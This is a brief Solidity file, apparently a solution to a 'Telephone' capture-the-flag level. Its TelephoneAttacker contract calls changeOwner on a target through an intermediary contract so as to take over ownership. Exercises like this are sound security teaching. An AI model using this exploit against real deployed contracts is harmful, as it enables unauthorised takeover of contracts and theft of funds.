// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    function attackChangeOwner(address addr, address _owner) public {
        ITelephone(addr).changeOwner(_owner);
    }
}
